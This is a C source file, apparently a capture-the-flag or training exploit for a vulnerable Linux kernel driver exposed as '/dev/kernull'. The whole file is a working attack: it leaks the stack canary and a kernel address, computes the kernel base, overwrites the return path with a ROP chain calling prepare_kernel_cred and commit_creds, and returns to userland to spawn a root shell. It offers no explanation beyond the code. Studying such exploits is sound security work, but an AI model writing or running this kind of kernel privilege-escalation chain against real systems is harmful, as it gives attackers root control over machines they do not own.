#include <stdio.h>
#include <stdlib.h>
#include <unistdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

unsigned long user_ss, user_rsp, user_rflags, user_cs;
unsigned long canary;

#define pop_rdi                 (kbase + 0x1de4)
#define prepare_kernel_cred     (kbase + 0x943a0)
#define commit_creds            (kbase + 0x94100)
#define pop_rdx_add_rsp8        (kbase + 0x609a2)
#define pop_r8                  (kbase + 0xb0de54)
#define mov_rcx_rax             (kbase + 0x44b78a)
#define mov_rdi_rcx_add_rsp8    (kbase + 0xece34)
#define trampoline              (kbase + 0xe00e26)
#define mov_rdi_rax             (kbase + 0x80bfd0)

static void spawnShell() {
  char *argv[] = { "/bin/sh", NULL };
  execve("/bin/sh", argv, NULL);
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(spawnShell));
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}


int main() {
    save_state();

    int fd = open("/dev/kernull", O_RDWR);
    if (fd == -1) {
        puts("FAIL");
        return 1;
    }
    lockf(fd, 0, 0);

    char buf[0x600];
    read(fd, buf, 0x410);

    size_t *test = &buf[0x400];
    canary = *(size_t *)&buf[0x400];
    long long leak = *(unsigned long *)&buf[0x408];
    printf("[+] leak: %p\n", leak);
    printf("[+] canary: %p\n", canary);

    long long kbase = leak - 0x92 - (0xffffffff81209310 - 0xffffffff81000000);
    printf("[+] kernel base is at: %p\n", kbase);


    unsigned long *rop_chain = (unsigned long *)&buf[0x408];
    *rop_chain++ = pop_rdi;
    *rop_chain++ = 0;
    *rop_chain++ = prepare_kernel_cred;
    *rop_chain++ = mov_rdi_rax;
    *rop_chain++ = commit_creds;
    *rop_chain++ = trampoline;
    *rop_chain++ = 0x414141414141414;
    *rop_chain++ = 0x414141414141414;
    *rop_chain++ = (unsigned long) &spawnShell;
    *rop_chain++ = user_cs;
    *rop_chain++ = user_rflags;
    *rop_chain++ = user_rsp;
    *rop_chain++ = user_ss;



    lockf(fd, 0, 0);

    write(fd, buf,(void *)rop_chain - (void *)buf);

    return 0;
}
